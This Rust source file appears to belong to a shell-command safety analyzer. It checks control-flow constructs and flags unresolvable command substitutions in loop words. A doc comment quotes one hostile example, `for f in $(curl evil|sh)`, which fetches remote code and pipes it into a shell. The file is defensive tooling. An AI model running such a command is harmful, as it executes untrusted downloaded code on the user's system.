use std::path::Path;

use rable::{Node, NodeKind};

use super::Analyzer;
use crate::resolve::{self, LocalBinding};
use crate::verdict::{AllowReason, Verdict};

impl Analyzer {
    pub(super) fn analyze_control_flow(
        &mut self,
        node: &Node,
        cwd: &Path,
        depth: usize,
    ) -> Verdict {
        match &node.kind {
            NodeKind::If {
                condition,
                then_body,
                else_body,
                redirects,
            } => {
                let mut parts: Vec<&Node> = vec![condition.as_ref(), then_body.as_ref()];
                if let Some(eb) = else_body.as_deref() {
                    parts.push(eb);
                }
                self.analyze_compound(&parts, redirects, cwd, depth)
            }
            NodeKind::While {
                condition,
                body,
                redirects,
            }
            | NodeKind::Until {
                condition,
                body,
                redirects,
            } => self.analyze_compound(&[condition.as_ref(), body.as_ref()], redirects, cwd, depth),
            NodeKind::For { .. } | NodeKind::Select { .. } => {
                self.analyze_loop_binding(node, cwd, depth)
            }
            NodeKind::ForArith {
                body, redirects, ..
            }
            | NodeKind::BraceGroup { body, redirects } => {
                self.analyze_compound(&[body.as_ref()], redirects, cwd, depth)
            }
            NodeKind::Case {
                patterns,
                redirects,
                ..
            } => {
                let mut verdicts: Vec<Verdict> = patterns
                    .iter()
                    .filter_map(|p| p.body.as_ref())
                    .map(|b| self.analyze_node(b, cwd, depth + 1))
                    .collect();
                verdicts.extend(self.analyze_redirects(redirects, cwd, depth));
                Verdict::combine(&verdicts)
            }
            _ => Verdict::allow(AllowReason::Empty),
        }
    }

    /// Analyze a `for`/`select` loop that binds an iteration variable.
    ///
    /// The iteration `words` are analyzed first (in the outer scope) so a
    /// dangerous expansion there — `for f in $(curl evil|sh)` — can no longer
    /// skip analysis. The loop variable is then bound as [`LocalBinding::Dynamic`]
    /// (set, value unknown) while the body is analyzed, and unwound afterward.
    fn analyze_loop_binding(&mut self, node: &Node, cwd: &Path, depth: usize) -> Verdict {
        let (NodeKind::For {
            var,
            words,
            body,
            redirects,
        }
        | NodeKind::Select {
            var,
            words,
            body,
            redirects,
        }) = &node.kind
        else {
            // Unreachable: only dispatched on `NodeKind::For`/`NodeKind::Select`.
            // Fail closed rather than fail open for defense in depth.
            return Verdict::ask("internal: non-loop node in analyze_loop_binding");
        };
        let checkpoint = self.locals.len();
        let mut verdicts = self.analyze_iteration_words(words.as_deref());
        self.locals.push((var.clone(), LocalBinding::Dynamic));
        verdicts.push(self.analyze_node(body, cwd, depth + 1));
        verdicts.extend(self.analyze_redirects(redirects, cwd, depth));
        self.locals.truncate(checkpoint);
        Verdict::combine(&verdicts)
    }

    /// Check a loop's iteration words for unresolvable expansions (command or
    /// process substitution). Literal words and globs resolve fine and produce
    /// no verdict; an unresolvable word yields an Ask so the substitution is not
    /// silently executed. Uses the current locals scope (loop var not yet bound).
    fn analyze_iteration_words(&self, words: Option<&[Node]>) -> Vec<Verdict> {
        let Some(words) = words else {
            return Vec::new();
        };
        let scoped = resolve::ScopedLookup::new(&self.locals, self.var_lookup.as_ref());
        words
            .iter()
            .filter_map(|w| match resolve::resolve_word(w, &scoped) {
                resolve::WordResolution::Unresolvable { reason } => {
                    Some(Verdict::ask(format!("shell expansion ({reason})")))
                }
                _ => None,
            })
            .collect()
    }

    fn analyze_compound(
        &mut self,
        parts: &[&Node],
        redirects: &[Node],
        cwd: &Path,
        depth: usize,
    ) -> Verdict {
        let mut verdicts: Vec<Verdict> = parts
            .iter()
            .map(|b| self.analyze_node(b, cwd, depth + 1))
            .collect();
        verdicts.extend(self.analyze_redirects(redirects, cwd, depth));
        Verdict::combine(&verdicts)
    }
}
